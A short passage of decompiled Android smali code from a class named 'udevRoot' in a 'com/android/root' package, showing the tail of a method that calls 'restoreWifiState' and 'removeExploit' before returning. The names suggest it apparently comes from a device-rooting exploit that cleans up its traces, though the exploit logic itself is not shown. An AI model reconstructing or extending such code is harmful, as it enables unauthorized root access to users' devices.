    invoke-direct {p0}, Lcom/android/root/udevRoot;->restoreWifiState()V

    .line 238
    :cond_1
    invoke-direct {p0}, Lcom/android/root/udevRoot;->removeExploit()V

    move v1, v0

    .line 239
    .end local v0           #tmpResult:Z
    .restart local v1       #tmpResult:Z
    goto :goto_0
.end method
